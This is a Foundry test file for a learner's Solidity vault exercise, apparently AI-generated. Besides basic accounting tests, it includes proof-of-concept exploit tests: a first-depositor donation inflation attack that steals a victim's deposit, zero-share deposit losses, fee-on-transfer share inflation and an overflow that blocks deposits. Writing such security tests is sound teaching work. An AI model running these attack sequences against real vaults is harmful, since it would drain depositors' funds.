// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console2} from "forge-std/Test.sol";
import {Vault, ShareToken} from "../src/Vault.sol";

// THIS IS AI GENERATED TEST. FOR EXERCISE 8.

contract MockERC20 {
    mapping(address account => uint256 balance) public balanceOf;
    mapping(address owner => mapping(address spender => uint256 amount)) public allowance;

    bool public failTransfer;
    bool public failTransferFrom;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (failTransfer) return false;

        require(balanceOf[msg.sender] >= amount, "insufficient balance");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (failTransferFrom) return false;

        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        require(balanceOf[from] >= amount, "insufficient balance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        return true;
    }

    function setFailTransfer(bool shouldFail) external {
        failTransfer = shouldFail;
    }

    function setFailTransferFrom(bool shouldFail) external {
        failTransferFrom = shouldFail;
    }
}

contract FeeOnTransferERC20 {
    uint256 internal constant BPS_DENOMINATOR = 10_000;

    mapping(address account => uint256 balance) public balanceOf;
    mapping(address owner => mapping(address spender => uint256 amount)) public allowance;

    uint256 public immutable feeBps; // this is the amount of percentage that they gonna take.

    constructor(uint256 _feeBps) {
        feeBps = _feeBps;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");

        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);

        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");

        uint256 fee = (amount * feeBps) / BPS_DENOMINATOR;
        uint256 amountReceived = amount - fee;

        balanceOf[from] -= amount;
        balanceOf[to] += amountReceived;
    }
}

contract VaultSecurityTest is Test {
    uint256 internal constant INITIAL_BALANCE = 1_000_000e18;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal bel = makeAddr("bel");
    address internal attacker = makeAddr("attacker");

    MockERC20 internal asset;
    Vault internal vault;
    ShareToken internal shareToken;

    function setUp() public {
        asset = new MockERC20();
        vault = new Vault(address(asset));
        shareToken = vault.shareToken();

        _mintAndApprove(asset, alice, address(vault), INITIAL_BALANCE);
        _mintAndApprove(asset, bob, address(vault), INITIAL_BALANCE);
        _mintAndApprove(asset, bel, address(vault), type(uint256).max);
        _mintAndApprove(asset, attacker, address(vault), INITIAL_BALANCE);
    }

    function test_Deposit_FirstDepositorReceivesOneToOneShares() public {
        uint256 amount = 100e18;

        vm.prank(alice);
        vault.deposite(amount);

        assertEq(asset.balanceOf(address(vault)), amount);
        assertEq(vault.totalAsset(), amount);
        assertEq(vault.sharesOf(alice), amount);
        assertEq(shareToken.totalSupply(), amount);
    }

    function test_Deposit_SecondDepositorReceivesProportionalShares() public {
        vm.prank(alice);
        vault.deposite(100e18);

        vm.prank(bob);
        vault.deposite(50e18);

        assertEq(vault.totalAsset(), 150e18);
        assertEq(vault.sharesOf(alice), 100e18);
        assertEq(vault.sharesOf(bob), 50e18);
        assertEq(shareToken.totalSupply(), 150e18);
    }

    function test_Withdraw_BurnsSharesAndReturnsAssets() public {
        vm.prank(alice);
        vault.deposite(100e18);

        uint256 aliceBalanceBefore = asset.balanceOf(alice);

        vm.prank(alice);
        vault.withdraw(40e18);

        assertEq(vault.sharesOf(alice), 60e18);
        assertEq(shareToken.totalSupply(), 60e18);
        assertEq(vault.totalAsset(), 60e18);
        assertEq(asset.balanceOf(alice), aliceBalanceBefore + 40e18);
    }

    function test_RevertWhenDepositingZero() public {
        vm.expectRevert(Vault.ZeroAmountInputed.selector);

        vm.prank(alice);
        vault.deposite(0);
    }

    function test_RevertWhenWithdrawingZero() public {
        vm.prank(alice);
        vault.deposite(1e18);

        vm.expectRevert(Vault.ZeroAmountInputed.selector);

        vm.prank(alice);
        vault.withdraw(0);
    }

    function test_RevertWhenWithdrawingMoreSharesThanOwned() public {
        vm.prank(alice);
        vault.deposite(1e18);

        vm.expectRevert(Vault.InsufficentShare.selector);

        vm.prank(alice);
        vault.withdraw(1e18 + 1);
    }

    function test_RevertWhenUnderlyingTransferFromReturnsFalse() public {
        asset.setFailTransferFrom(true);

        vm.expectRevert("transaction failed");

        vm.prank(alice);
        vault.deposite(10e18);

        assertEq(vault.totalAsset(), 0);
        assertEq(vault.sharesOf(alice), 0);
        assertEq(shareToken.totalSupply(), 0);
    }

    function test_RevertWhenUnderlyingTransferReturnsFalseAndPreservesState() public {
        vm.prank(alice);
        vault.deposite(10e18);

        asset.setFailTransfer(true);

        vm.expectRevert("transactoin failed");

        vm.prank(alice);
        vault.withdraw(10e18);

        assertEq(vault.totalAsset(), 10e18);
        assertEq(vault.sharesOf(alice), 10e18);
        assertEq(shareToken.totalSupply(), 10e18);
        assertEq(asset.balanceOf(alice), INITIAL_BALANCE - 10e18);
    }

    function test_OnlyVaultCanMintShares() public {
        vm.expectRevert("you are not the owner of this token");

        vm.prank(attacker);
        shareToken.mint(1e18, attacker);
    }

    function test_OnlyVaultCanBurnShares() public {
        vm.expectRevert("not owner");

        vm.prank(attacker);
        shareToken.burn(attacker, 0);
    }

    function test_PreviewDepositMatchesActualSharesWhenNoRoundingOccurs() public {
        vm.prank(alice);
        vault.deposite(100e18);

        uint256 previewedShares = vault.previewDeposit(25e18);

        vm.prank(bob);
        vault.deposite(25e18);

        assertEq(previewedShares, 25e18);
        assertEq(vault.sharesOf(bob), previewedShares);
    }

    function test_InflationAttack_DonationMakesVictimDepositMintZeroShares() public {
        vm.prank(attacker);
        vault.deposite(1);

        vm.prank(attacker);
        asset.transfer(address(vault), 1_000e18);

        assertEq(vault.totalAsset(), 1_000e18 + 1);
        assertEq(shareToken.totalSupply(), 1);

        uint256 victimDeposit = 1e18;
        assertEq(vault.previewDeposit(victimDeposit), 0);

        uint256 bobBalanceBefore = asset.balanceOf(bob);

        vm.prank(bob);
        vault.deposite(victimDeposit);

        assertEq(vault.sharesOf(bob), 0);
        assertEq(asset.balanceOf(bob), bobBalanceBefore - victimDeposit);
        assertEq(vault.totalAsset(), 1_001e18 + 1);
    }

    function test_InflationAttack_AttackerStealsVictimDeposit() public {
        uint256 attackerDonation = 1_000e18;
        uint256 victimDeposit = 1e18;

        vm.prank(attacker);
        vault.deposite(1);

        vm.prank(attacker);
        asset.transfer(address(vault), attackerDonation);

        uint256 attackerBalanceBeforeVictimDeposit = asset.balanceOf(attacker);

        vm.prank(bob);
        vault.deposite(victimDeposit);

        assertEq(vault.sharesOf(bob), 0);

        vm.prank(attacker);
        vault.withdraw(1);

        assertEq(vault.totalAsset(), 0);
        assertEq(vault.sharesOf(attacker), 0);
        assertEq(asset.balanceOf(attacker), attackerBalanceBeforeVictimDeposit + attackerDonation + victimDeposit + 1);
    }

    function test_DonationBeforeFirstDepositLetsFirstDepositorClaimDonation() public {
        uint256 donatedAssets = 100e18;
        uint256 firstDeposit = 1e18;

        vm.prank(attacker);
        asset.transfer(address(vault), donatedAssets);

        vm.prank(alice);
        vault.deposite(firstDeposit);

        assertEq(vault.sharesOf(alice), firstDeposit);
        assertEq(vault.totalAsset(), donatedAssets + firstDeposit);

        uint256 aliceBalanceBefore = asset.balanceOf(alice);

        vm.prank(alice);
        vault.withdraw(firstDeposit);

        assertEq(asset.balanceOf(alice), aliceBalanceBefore + donatedAssets + firstDeposit);
        assertEq(vault.totalAsset(), 0);
    }

    function test_ZeroShareDepositIsAcceptedAndUserLosesAssets() public {
        vm.prank(alice);
        vault.deposite(1);

        vm.prank(attacker);
        asset.transfer(address(vault), 100e18);

        uint256 bobBalanceBefore = asset.balanceOf(bob);

        vm.prank(bob);
        vault.deposite(1);

        assertEq(vault.sharesOf(bob), 0);
        assertEq(asset.balanceOf(bob), bobBalanceBefore - 1);
        assertEq(vault.totalAsset(), 100e18 + 2);
    }

    function test_FeeOnTransferTokenMintsSharesForAssetsVaultDidNotReceive() public {
        FeeOnTransferERC20 feeAsset = new FeeOnTransferERC20(100);
        Vault feeVault = new Vault(address(feeAsset));

        _mintAndApprove(feeAsset, alice, address(feeVault), INITIAL_BALANCE);
        _mintAndApprove(feeAsset, bob, address(feeVault), INITIAL_BALANCE);

        vm.prank(alice);
        feeVault.deposite(100e18);

        assertEq(feeVault.totalAsset(), 99e18);
        assertEq(feeVault.sharesOf(alice), 100e18);

        uint256 bobPreview = feeVault.previewDeposit(100e18);
        assertGt(bobPreview, 100e18);

        vm.prank(bob);
        feeVault.deposite(100e18);

        assertEq(feeVault.totalAsset(), 198e18);
        assertEq(feeVault.sharesOf(bob), bobPreview);
        assertGt(feeVault.sharesOf(bob), 100e18);
    }

    function test_Fee_on_transfer_for_withdraw() public {
        FeeOnTransferERC20 feeAsset = new FeeOnTransferERC20(100); // 1% fee
        Vault feeVault = new Vault(address(feeAsset));

        // shareToken in setUp() points to the OLD vault, so i have to reassign it
        // or every shareToken.totalSupply() call reads the wrong token
        shareToken = feeVault.shareToken();

        _mintAndApprove(feeAsset, alice, address(feeVault), INITIAL_BALANCE);
        _mintAndApprove(feeAsset, bob, address(feeVault), INITIAL_BALANCE);

        vm.prank(alice);
        feeVault.deposite(100e18);

        // alice sent 100 but the vault only got 99 because of the 1% fee
        // but she still got 100 shares. that's the bug right there.
        assertEq(feeVault.totalAsset(), 99e18);
        assertEq(feeVault.sharesOf(alice), 100e18);
        assertEq(shareToken.totalSupply(), 100e18);
        console2.log("alice share token: ", shareToken.totalSupply());
        console2.log("vault real asset balance: ", feeAsset.balanceOf(address(feeVault)));

        console2.log("bob deposite preview: ", feeVault.previewDeposit(100e18));

        vm.prank(bob);
        feeVault.deposite(100e18);

        uint256 shareTotalSupply = 100e18 + 101010101010101010101;

        assertEq(feeVault.totalAsset(), 99e18 + 99e18);
        assertEq(shareToken.totalSupply(), shareTotalSupply);

        uint256 totalAsset = 99e18 + 99e18;
        console2.log("total asset: ", totalAsset);

        // alice have 100e18 amount of share
        // bob have 101010101010101010101 amount of share
        // total supply is shareTotalSupply
        // so the maths should be (100e18 * totalAsset) / shareTotalSupply
        // for the reason we do the maths it will always mismatch the _amount and the
        // actual amount of money that will recive the valut
        // and that will cause wrong maths and it hurt the valut cuz you have more
        // share and you have less value in it.
        uint256 withdrawAmount = (100e18 * totalAsset) / shareTotalSupply;
        uint256 onehundrede18 = 100e18;
        console2.log("alice gets from withdraw: ", withdrawAmount);
        console2.log("alice deposited: ", onehundrede18);
        console2.log("alice loss from share inflation alone: ", onehundrede18 - withdrawAmount);

        // now actually assert the loss instead of just logging it
        uint256 aliceBalanceBefore = feeAsset.balanceOf(alice);

        vm.prank(alice);
        feeVault.withdraw(100e18);

        uint256 aliceReceived = feeAsset.balanceOf(alice) - aliceBalanceBefore;
        console2.log("alice actually received: ", aliceReceived);

        // she gets back less than she put in, two reasons:
        // 1. share inflation - vault minted shares for money it never received
        // 2. exit fee - the feeAsset.transfer on the way out takes another 1%
        assertLt(aliceReceived, 100e18);

        // and the vault is left holding dust for bob, so bob also loses
        console2.log("vault left with: ", feeAsset.balanceOf(address(feeVault)));
        console2.log("bob still has shares: ", feeVault.sharesOf(bob));
    }

    function test_OverflowInShareCalculationCanBlockDeposits() public {
        uint256 nearMax = type(uint256).max / 2 + 1;

        vm.prank(bel);
        vault.deposite(nearMax);

        vm.prank(attacker);
        asset.transfer(address(vault), 1);

        vm.expectRevert();

        vm.prank(bob);
        vault.deposite(2);
    }

    function testFuzz_DepositWithdrawRoundTripPreservesAccounting(uint96 rawDepositAmount, uint96 rawWithdrawAmount)
        public
    {
        uint256 depositAmount = bound(uint256(rawDepositAmount), 1, 100_000e18);

        vm.prank(alice);
        vault.deposite(depositAmount);

        uint256 sharesToBurn = bound(uint256(rawWithdrawAmount), 1, depositAmount);
        uint256 aliceBalanceBefore = asset.balanceOf(alice);

        vm.prank(alice);
        vault.withdraw(sharesToBurn);

        assertEq(vault.sharesOf(alice), depositAmount - sharesToBurn);
        assertEq(shareToken.totalSupply(), depositAmount - sharesToBurn);
        assertEq(vault.totalAsset(), depositAmount - sharesToBurn);
        assertEq(asset.balanceOf(alice), aliceBalanceBefore + sharesToBurn);
    }

    function _mintAndApprove(MockERC20 token, address user, address spender, uint256 amount) internal {
        token.mint(user, amount);

        vm.prank(user);
        token.approve(spender, type(uint256).max);
    }

    function _mintAndApprove(FeeOnTransferERC20 token, address user, address spender, uint256 amount) internal {
        token.mint(user, amount);

        vm.prank(user);
        token.approve(spender, type(uint256).max);
    }
}
